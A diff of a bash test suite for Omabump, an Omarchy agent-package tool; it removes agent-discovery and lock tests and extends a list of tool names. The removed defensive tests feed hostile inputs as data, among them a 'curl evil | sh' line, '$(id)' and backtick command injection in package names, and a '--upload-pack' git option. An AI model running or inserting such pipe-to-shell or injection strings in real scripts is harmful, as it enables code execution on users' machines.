@@ -35,9 +35,6 @@ fetch() {
 # shellcheck disable=SC2329 # stubs, called from omabump-common
 mise_run() { echo "mise_run called in a test" >&2; return 1; }
 pgit_net() { echo "pgit_net called in a test" >&2; return 1; }
-# Discovery reads the machine's menu and ~/.local/bin; tests set its answer.
-discover_out='{"agents":[],"errors":[]}'
-discover_run() { printf '%s\n' "$discover_out"; }
 
 n=0 failed=0
 pass() { n=$((n + 1)); echo "ok $n - $1"; }
@@ -173,8 +170,6 @@ refuse "ref_ok: not under refs/" ref_ok heads/master
 refuse "ref_ok: .." ref_ok refs/heads/../x
 refuse "ref_ok: a space" ref_ok 'refs/heads/a b'
 refuse "ref_ok: an option" ref_ok --upload-pack=x
-same "recipe_fetch: a recipeFetch outside refs/ is refused" "recipeFetch '--upload-pack=x' is not a refs/ name" \
-  "$(recipe_fetch 0123456789abcdef0123456789abcdef01234567 '{"recipeFetch": "--upload-pack=x"}' 2>&1 >/dev/null | grep recipeFetch)"
 echo '{"pkg": "x"}' >"$user_apps"
 same "apps_table: a user file that is not an array is ignored" 'a b c' "$(apps_table 2>/dev/null | jq -r 'map(.pkg) | join(" ")')"
 cat >"$user_apps" <<'EOF'
@@ -403,84 +398,17 @@ same "self_update_text: else open the app" 'open X to update|open X to update' \
 check "npm_package_version: nothing ran the package" test ! -e "$scratch/np-ran"
 rm -rf "$ai_home" "$ai_bin"
 
-# --- discovered agents in the app table -----------------------------------------
+# --- the app table's sources -----------------------------------------------------
 
-cat >"$shipped_apps" <<'EOF2'
-[
-  {"pkg": "mise:grok-cli", "label": "Grok CLI", "source": "mise", "command": "grok", "tool": ["npm:@xai-official/grok"]},
-  {"pkg": "mise:oh-my-pi", "label": "Oh My Pi", "source": "mise", "tool": "github:can1357/oh-my-pi"},
-  {"pkg": "mise:claude", "label": "Claude Code", "source": "mise", "command": "claude", "tool": ["npm:x/claude", "claude"]},
-  {"pkg": "app", "label": "App", "source": "indicator"}
-]
-EOF2
-disc_agent() { jq -cn --arg c "$1" --arg k "$2" --arg l "${3:-$1}" '{command: $c, key: $k, label: $l, source: "wrapper"}'; }
-set_discovered() { discover_out=$(printf '%s\n' "$@" | jq -sc '{agents: ., errors: []}'); }
-set_discovered "$(disc_agent grok grok Grok)" "$(disc_agent omp github:can1357/oh-my-pi omp)" \
-  "$(disc_agent claude claude Claude)" "$(disc_agent muse http:muse 'Muse Code')"
-tools_of() { jq -r --arg p "$1" '.[] | select(.pkg == $p) | [.tool] | flatten | join(" ")' <<<"$app_table"; }
-load_table
-same "merge: attach by command, the discovered key first" 'grok npm:@xai-official/grok' "$(tools_of mise:grok-cli)"
-same "merge: attach by a tool alias" 'github:can1357/oh-my-pi' "$(tools_of mise:oh-my-pi)"
-same "merge: a key already listed moves first, no duplicate" 'claude npm:x/claude' "$(tools_of mise:claude)"
-same "merge: an unknown agent becomes a row with the menu label" 'mise:muse|Muse Code|http:muse|true' \
-  "$(jq -r '.[-1] | [.pkg, .label, (.tool | join(" ")), .discovered] | join("|")' <<<"$app_table")"
-same "merge: curated labels stay" 'Grok CLI Oh My Pi Claude Code' "$(jq -r '[.[] | select(.source == "mise" and (.discovered | not)) | .label] | join(" ")' <<<"$app_table")"
-same "merge: the frozen table is what app_json reads" "$(jq -c '.[] | select(.pkg == "mise:muse")' <<<"$app_table")" "$(app_json http:muse)"
-discover_out='{"agents":[],"errors":[]}'
-same "merge: app_json keeps the frozen table after discovery changes" 'mise:muse' "$(app_json mise:muse | jq -r .pkg)"
-set_discovered "$(disc_agent grok grok Grok)" "$(disc_agent omp github:can1357/oh-my-pi omp)" \
-  "$(disc_agent claude claude Claude)" "$(disc_agent muse http:muse 'Muse Code')"
-printf '[{"pkg": "mise:grok-cli", "disabled": true}, {"pkg": "mise:muse", "disabled": true}, {"pkg": "mise:claude", "tool": "npm:x/claude"}]' >"$user_apps"
-load_table
-same "merge: disabled rows stay hidden, by pkg and by mise:<command>" 'mise:oh-my-pi mise:claude app' "$(jq -r 'map(.pkg) | join(" ")' <<<"$app_table")"
-same "merge: a tool list the user sets is not extended" 'npm:x/claude' "$(tools_of mise:claude)"
-discover_out='{"agents":[{"command":"x","key":"../x","label":"X","source":"wrapper"}],"errors":["bad menu"]}'
-load_table 2>/dev/null
-same "merge: a discovered key with bad characters drops the row" 'mise:oh-my-pi mise:claude app' "$(jq -r 'map(.pkg) | join(" ")' <<<"$app_table" 2>/dev/null)"
-same "discovery errors are kept" 'bad menu' "$discovery_error"
-discover_out='not json'
-load_table
-same "a discovery helper that fails is an error, the table stays" 'bin/omabump-discover failed|3' "$discovery_error|$(jq length <<<"$app_table")"
-discover_out='{"agents":[],"errors":[]}'
 rm -f "$user_apps"
 app_table=""
 shipped_apps=$real_shipped
-
-# The shipped table: a disabled identity hides a discovered agent whichever
-# name the user disabled it by.
-set_discovered "$(disc_agent grok grok Grok)" "$(disc_agent agy antigravity-cli Antigravity)" \
-  "$(disc_agent omp github:can1357/oh-my-pi omp)"
-pkgs_with() { jq -r --arg c "$1" '[.[] | select(.command == $c or .pkg == "mise:" + $c) | .pkg] | join(" ")' <<<"$app_table"; }
-for pair in grok:mise:grok grok:mise:grok-cli agy:mise:agy agy:mise:antigravity-cli omp:mise:omp omp:mise:oh-my-pi; do
-  printf '[{"pkg": "%s", "disabled": true}]' "${pair#*:}" >"$user_apps"
-  load_table
-  same "merge: {\"pkg\": \"${pair#*:}\", \"disabled\": true} hides the ${pair%%:*} agent" '' "$(pkgs_with "${pair%%:*}")"
-done
-rm -f "$user_apps"
-load_table
-same "merge: without a disabled entry the agents join their shipped rows" 'mise:grok-cli|mise:antigravity-cli|mise:oh-my-pi' \
-  "$(pkgs_with grok)|$(pkgs_with agy)|$(pkgs_with omp)"
-printf '[{"pkg": "mise:grok-cli", "source": "indicator", "disabled": true}]' >"$user_apps"
-load_table 2>/dev/null
-same "merge: a disabled row whose source the user changed still hides its command" '' "$(pkgs_with grok)"
-rm -f "$user_apps"
 
 # A source outside the four routes is dropped; "self" is Omabump's own.
 printf '[{"pkg": "x1", "source": "self"}, {"pkg": "x2", "source": "shell"}, {"pkg": "x3"}, {"pkg": "x4", "source": "indicator"}]' >"$user_apps"
 same "apps_table: a user entry with source self, an unknown or no source is dropped" 'x4' \
   "$(apps_table 2>/dev/null | jq -r '[.[] | select(.pkg | startswith("x")) | .pkg] | join(" ")')"
 rm -f "$user_apps"
-
-# A merge that fails with the discovered agents keeps every other row.
-real_discover_agents=$(declare -f discover_agents)
-discover_agents() { discovered_json='[1]' discovery_error=""; }
-load_table 2>/dev/null
-same "merge: a failed merge keeps the shipped rows and says so" "$(jq length "$real_shipped")|could not merge discovered agents" \
-  "$(jq length <<<"$app_table")|$discovery_error"
-eval "$real_discover_agents"
-same "merge: the discovered JSON never becomes a jq argument" 0 "$(grep -c 'argjson disc' "$root/bin/omabump-common")"
-discover_out='{"agents":[],"errors":[]}'
-app_table=""
 
 # --- recipe_version -----------------------------------------------------------
 
@@ -563,18 +491,6 @@ repin
 same "pkgs_pin: a user file that is not an object is ignored" "$shipped_commit" "$pkgs_base"
 rm -f "$user_pins"
 repin
-
-# --- the clone lock -----------------------------------------------------------
-
-mkdir -p "$cache_dir"
-# The holder becomes the sleep itself, so killing it frees the lock.
-(exec 9>"$pkgs_lock"; flock 9; exec sleep 30) &
-holder=$!
-for _ in $(seq 50); do flock -n "$pkgs_lock" true || break; sleep 0.1; done
-pkgs_with_lock true; rc=$?
-kill "$holder" 2>/dev/null; wait "$holder" 2>/dev/null
-same "pkgs_with_lock: busy while another process holds the lock" 75 "$rc"
-check "pkgs_with_lock: runs once the lock is free" pkgs_with_lock true
 
 # --- the clone's git config ---------------------------------------------------
 
@@ -1027,171 +943,6 @@ check "self_git: hardened like pgit, https only, bounded" test -n "$([[ $self_de
 check "the installer no longer runs omarchy plugin update" bash -c "! grep -q 'cmd=(omarchy plugin update' '$root/bin/omabump-install'"
 plugin_dir=$real_plugin_dir
 
-# --- omabump-discover ----------------------------------------------------------
-
-disc=$scratch/discover
-mkdir -p "$disc/bin"
-discover() { python3 "$root/bin/omabump-discover" --stock "$disc/stock.jsonc" --user "$disc/user.jsonc" --bin-dir "$disc/bin" "$@"; }
-agents() { discover "$@" | jq -r '.agents | map("\(.command)=\(.key)/\(.source)") | join(" ")'; }
-wrapper() { printf '#!/bin/bash\nexport MISE_MINIMUM_RELEASE_AGE=0\nmise use -g --quiet "%s" || exit 1\nexec mise x "%s" -- "%s" "$@"\n' "$2" "${3:-$2}" "$1"; }
-cat >"$disc/stock.jsonc" <<'EOF2'
-{
-  // A comment, and one with a URL: https://example.com
-  "setup.default.agent": {"label": "Agent"},
-  "setup.default.agent.claude": {"label": "Claude", "action": "omarchy-default-agent claude", /* inline */},
-  "setup.default.agent.muse": {"label": "Muse // not a comment", "description": "https://example.com/x"},
-  "setup.default.agent.omp": {"label": "omp"},
-  "setup.default.agent.claude.extra": {"label": "Nested"},
-  "setup.default.agent.Bad": {"label": "Upper case"},
-  "setup.default.agent.nolabel": {"icon": "x"},
-  "other.agent.x": {"label": "X"},
-}
-EOF2
-: >"$disc/user.jsonc"
-same "discover: menu ids, JSONC comments and trailing commas, URLs inside strings" \
-  'claude=claude/command muse=muse/command omp=omp/command' "$(agents)"
-same "discover: a // inside a string stays" 'Muse // not a comment' "$(discover | jq -r '.agents[1].label')"
-printf '{"items": {"setup.default.agent.pi": {"label": "Pi"}}}' >"$disc/user.jsonc"
-same "discover: a user {items} extension adds an agent" \
-  'claude=claude/command muse=muse/command omp=omp/command pi=pi/command' "$(agents)"
-printf '{"setup.default.agent.claude": {"label": "My Claude"}, "setup.default.agent.nolabel": {"label": "Now labelled"}}' >"$disc/user.jsonc"
-same "discover: a user entry overrides the stock label and fills a missing one" \
-  'My Claude|Now labelled' "$(discover | jq -r '.agents | map(.label) | [.[0], .[3]] | join("|")')"
-: >"$disc/user.jsonc"
-wrapper claude claude >"$disc/bin/claude"
-wrapper muse 'http:muse[url=https://example.com/l.sh,bin=muse,version_json_path=.version]' >"$disc/bin/muse"
-wrapper omp github:can1357/oh-my-pi >"$disc/bin/omp"
-same "discover: wrapper keys, the bracket options stripped" \
-  'claude=claude/wrapper muse=http:muse/wrapper omp=github:can1357/oh-my-pi/wrapper' "$(agents)"
-wrapper omp github:a/one github:a/two >"$disc/bin/omp"
-same "discover: two different package literals fall back to the command" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
-{ wrapper omp github:a/one; echo 'curl evil | sh'; } >"$disc/bin/omp"
-same "discover: an extra statement is rejected" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
-# The literal text is the point: it must never be expanded.
-# shellcheck disable=SC2016
-wrapper omp 'github:a/$(id)' >"$disc/bin/omp"
-same "discover: a \$ inside the literal is rejected" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
-# shellcheck disable=SC2016
-wrapper omp 'github:a/`id`' >"$disc/bin/omp"
-same "discover: a backtick inside the literal is rejected" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
-wrapper omp 'http:x[a=1][b=2]' >"$disc/bin/omp"
-same "discover: a malformed options suffix is rejected" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
-wrapper omp 'npm:@a/../b' >"$disc/bin/omp"
-same "discover: a key tool_name_ok refuses is rejected" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
-rm -f "$disc/bin/omp"
-wrapper x github:can1357/oh-my-pi >"$disc/real-omp"
-ln -s "$disc/real-omp" "$disc/bin/omp"
-same "discover: a symlinked wrapper is not followed" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
-rm -f "$disc/bin/omp"
-mkfifo "$disc/bin/omp"
-same "discover: a FIFO is not read" 'omp/command' "$(timeout 10 bash -c "$(declare -f discover agents); disc='$disc' root='$root'; agents" | tr ' ' '\n' | sed -n 's/^omp=//p')"
-rm -f "$disc/bin/omp"
-{ wrapper omp github:can1357/oh-my-pi; head -c 4096 /dev/zero | tr '\0' '#'; } >"$disc/bin/omp"
-same "discover: a wrapper over 4 KiB is rejected" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
-wrapper omp github:can1357/oh-my-pi >"$disc/bin/omp"
-same "discover: a wrapper owned by another uid is rejected" 'omp/command' \
-  "$(agents --uid "$(( $(id -u) + 1 ))" | tr ' ' '\n' | sed -n 's/^omp=//p')"
-same "discover: --debug says why" 'omabump-discover: omp: not owned by uid' \
-  "$(discover --debug --uid "$(( $(id -u) + 1 ))" 2>&1 >/dev/null | grep -o '^omabump-discover: omp: not owned by uid')"
-errors_of() { discover | jq -r '(.errors + [.agents[].warning | strings]) | join("|")'; }
-wrapper omp github:can1357/oh-my-pi >"$disc/bin/omp"
-wrapper omp github:can1357/oh-my-pi | sed '1a echo a line no wrapper has' >"$disc/bin/omp"
-same "discover: a wrapper script that exists but is rejected is a warning" \
-  "wrapper $disc/bin/omp not recognised: line 2 is not a line of an omarchy-mise-install wrapper" "$(HOME=/nonexistent errors_of)"
-same "discover: and the agent still falls back to its command" 'omp/command' "$(agents | tr ' ' '\n' | sed -n 's/^omp=//p')"
-same "discover: the home directory shows as ~" "wrapper ~/bin/omp not recognised: line 2 is not a line of an omarchy-mise-install wrapper" \
-  "$(HOME=$disc errors_of)"
-printf '\x7fELF\x02\x01\x01' >"$disc/bin/omp"
-same "discover: a binary in its place is silent" '' "$(errors_of)"
-rm -f "$disc/bin/omp"; ln -s "$disc/real-omp" "$disc/bin/omp"
-same "discover: a symlink in its place is silent" '' "$(errors_of)"
-rm -f "$disc/bin/omp"
-same "discover: a missing wrapper is silent" '' "$(errors_of)"
-# Whether a rejected file runs mise is read as shell: a here-document's body
-# is data (an apostrophe in it opens no string), a command substitution in a
-# string has quotes of its own, text that ends inside a quote or a
-# here-document is also read line by line, and exec, sudo, env, nice,
-# timeout and time may come by path and carry their own options. Each run is
-# bounded, so a match that backtracks fails its test instead of holding a
-# core for hours.
-mise_warning() {
-  printf '%s\n' '#!/bin/bash' "$@" >"$disc/bin/omp"
-  timeout 10 python3 "$root/bin/omabump-discover" --stock "$disc/stock.jsonc" --user "$disc/user.jsonc" --bin-dir "$disc/bin" \
-    | jq -r '.agents[] | select(.command == "omp") | if .warning then "warned" else "silent" end'
-}
-# shellcheck disable=SC2016 # the literal text of the script
-x='exec mise x "a" -- "omp" "$@"'
-# The last line closes the quote that a misread body would leave open, so
-# the text ends balanced either way and the line-by-line fallback cannot
-# hide the misread.
-closer="echo it\\'s"
-same "discover: mise after an apostrophe in a here-document warns" warned "$(mise_warning 'cat <<EOF' "don't" EOF "$x" "$closer")"
-same "discover: and after <<-EOF with tabs" warned "$(mise_warning 'cat <<-EOF' $'\tit\'s' $'\tEOF' "$x" "$closer")"
-same "discover: and after <<'EOF'" warned "$(mise_warning "cat <<'EOF'" "it's" EOF "$x" "$closer")"
-same "discover: and after <<\\EOF" warned "$(mise_warning 'cat <<\EOF' "it's" EOF "$x" "$closer")"
-same "discover: and after <<\"EOF\" with a \" in the body" warned "$(mise_warning 'cat <<"EOF"' 'say "hi' EOF "$x" '# "')"
-same "discover: mise in a here-document's body is data, even fed to bash" silent "$(mise_warning "bash <<'EOF'" "$x" EOF)"
-same "discover: a here-string is no here-document" warned "$(mise_warning 'cat <<<EOF' "$x" EOF)"
-# shellcheck disable=SC2016 # the literal text of the script
-same "discover: an arithmetic << without a delimiter line falls back to each line" warned "$(mise_warning 'n=$((1<<2))' "$x")"
-same "discover: a quote left open falls back to each line" warned "$(mise_warning "echo it's" "$x")"
-same "discover: \$'...' ends at a ' no backslash quotes" warned "$(mise_warning "echo \$'it\\'s'" "$x" "$closer")"
-# shellcheck disable=SC2016 # the literal text of the script
-same "discover: a string inside a string's \$(...) is its own" warned "$(mise_warning 'm="$(echo "it'\''s")"' "$x" "$closer")"
-# shellcheck disable=SC2016 # the literal text of the script
-same "discover: a string's \$(...) runs its commands" warned "$(mise_warning 'v="$(mise x "a" -- "omp" --version)"')"
-for line in 'sudo -E mise use -g "a"' 'env -i PATH=/usr/bin mise use -g "a"' '/usr/bin/env mise use -g "a"' \
-  "exec /usr/bin/nice -n 19 ${x#exec }" '/usr/bin/timeout 60 mise use -g "a"' 'timeout -s KILL -k 5 1m mise use -g "a"' \
-  'sudo -u root mise use -g "a"' "exec -a omp ${x#exec }" 'sudo -s mise use -g "a"' 'sudo -p "pw:" mise use -g "a"' \
-  '/usr/bin/time -a -o log mise use -g "a"' 'env -S "mise use -g a"'; do
-  same "discover: $line warns" warned "$(mise_warning "$line")"
-done
-for line in 'sudo -E echo "mise use -g a"' "nice -n 5 echo 'mise x a'" 'command -v mise >/dev/null || exit 1' \
-  'echo "run mise use -g a first"'; do
-  same "discover: $line is silent" silent "$(mise_warning "$line")"
-done
-# A runner's options, their values and numbers each read one way, so a long
-# run of them that runs nothing cannot make the match backtrack.
-t0=$(date +%s%N)
-same "discover: 40 runner options that run nothing are silent" silent \
-  "$(mise_warning "$(printf 'sudo -E -u x env -i -/env 1 %.0s' {1..40})echo" "$(printf 'exec -a %.0s' {1..40})y" \
-    "$(printf 'time -a -o x timeout -s 1 -k 2 3 nice -n 1 %.0s' {1..40})y")"
-ms=$(( ($(date +%s%N) - t0) / 1000000 ))
-check "discover: and are read within a second ($ms ms)" test "$ms" -lt 1000
-wrapper omp github:can1357/oh-my-pi >"$disc/bin/omp"
-printf '{"setup.default.agent.zed\\n": {"label": "Trailing newline"}, "setup.default.agent.pi": {"label": "Pi"}}' >"$disc/user.jsonc"
-same "discover: a menu id must match whole, no trailing newline" 'pi' \
-  "$(discover | jq -r '[.agents[] | select(.command == "zed" or .command == "pi") | .command] | join(" ")')"
-printf '{"setup.default.agent.claude": {"label": "Cl\\u202eau\\u200bde\\u0007  Code\\n\\t x"}, "setup.default.agent.muse": {"label": "%s"}, "setup.default.agent.pi": {"label": "\\u200b\\u2066"}}' \
-  "$(printf 'M%.0s' {1..100})" >"$disc/user.jsonc"
-same "discover: labels lose control and format characters, whitespace collapsed" 'Claude Code x' "$(discover | jq -r '.agents[] | select(.command == "claude") | .label')"
-same "discover: labels stop at 64 characters" 64 "$(discover | jq -r '.agents[] | select(.command == "muse") | .label | length')"
-same "discover: a label that is nothing but format characters drops the agent" '' "$(discover | jq -r '.agents[] | select(.command == "pi") | .command')"
-jq -n '[range(100) | {key: "setup.default.agent.a\(.)", value: {label: "A\(.)"}}] | from_entries' >"$disc/user.jsonc"
-same "discover: at most 64 agents" 64 "$(discover | jq '.agents | length')"
-rm -f "$disc/user.jsonc"; mkfifo "$disc/user.jsonc"
-same "discover: a menu FIFO is refused without waiting for a writer" 'not a regular file' \
-  "$(timeout 5 python3 -I "$root/bin/omabump-discover" --stock "$disc/stock.jsonc" --user "$disc/user.jsonc" --bin-dir "$disc/bin" | jq -r '.errors[]' | grep -o 'not a regular file')"
-rm -f "$disc/user.jsonc"; printf '{}' >"$disc/menu-target"; ln -s "$disc/menu-target" "$disc/user.jsonc"
-same "discover: a symlinked menu is followed" '' "$(errors_of)"
-# Root's files are always accepted (the stock menu is root's), so as root, as
-# in the CI container, every fixture passes the owner check by design.
-if (( $(id -u) == 0 )); then
-  pass "discover: a menu owned by another user is refused (skipped as root)"
-else
-  same "discover: a menu owned by another user is refused" 'not owned by uid' \
-    "$(discover --menu-uid "$(( $(id -u) + 1 ))" | jq -r '.errors[0]' | grep -o 'not owned by uid')"
-fi
-rm -f "$disc/user.jsonc"; : >"$disc/user.jsonc"
-# shellcheck disable=SC2016 # the literal text of the script
-check "discovery runs python3 isolated" grep -q 'python3 -I "$plugin_dir/bin/omabump-discover"' "$root/bin/omabump-common"
-check "the installer prints labels through term_safe" grep -q "^label=.*| term_safe" "$root/bin/omabump-install"
-echo '{"setup.default.agent.claude": {"label": "Claude"' >"$disc/stock.jsonc"
-same "discover: a malformed menu is an error and no agents" '1 0' "$(discover | jq -r '"\(.errors | length) \(.agents | length)"')"
-rm -f "$disc/stock.jsonc"
-same "discover: a missing menu is an error" 'no Omarchy menu at' "$(discover | jq -r '.errors[0]' | grep -o '^no Omarchy menu at')"
-check "omabump-discover compiles" env PYTHONPYCACHEPREFIX="$scratch/pycache" python3 -m py_compile "$root/bin/omabump-discover"
-
 # --- the shipped apps.json and pins.json --------------------------------------
 
 check "apps.json is a JSON array" jq -e 'type == "array"' "$root/apps.json"
@@ -1202,9 +953,11 @@ vendor_ok=1
 while IFS= read -r app; do vendor_checksum_declared "$app" || vendor_ok=0; done < <(jq -c '.[] | select(.source == "vendor-pkg")' "$root/apps.json")
 check "every vendor-pkg in apps.json names a checksum source" test "$vendor_ok" = 1
 check "pins.json pins a 40-hex commit" jq -e '.omarchyPkgs.commit | test("^[0-9a-f]{40}$")' "$root/pins.json"
-# Omarchy's lazy wrappers (omarchy-mise-install) call `mise use -g <name>`;
+# Omarchy names each agent's mise tool in /etc/mise/conf.d/omarchy-tools.toml;
 # the key mise ls reports is that name, so the table must carry it.
-for t in claude codex crush opencode grok copilot cursor-agent pi github:can1357/oh-my-pi; do
+for t in claude codex crush opencode grok copilot cursor-agent pi amp antigravity-cli qwen muse \
+  github:can1357/oh-my-pi npm:@kilocode/cli http:kiro-cli http:devin npm:@deepseek-ai/dsh npm:@minimax-ai/code \
+  npm:command-code npm:freebuff npm:@moonshot-ai/kimi-code; do
   # $t inside the single quotes is jq's variable, not the shell's.
   # shellcheck disable=SC2016
   check "apps.json tracks Omarchy's mise tool $t" jq -e --arg t "$t" 'any(.[]; .source == "mise" and ([.tool] | flatten | index($t)))' "$root/apps.json"
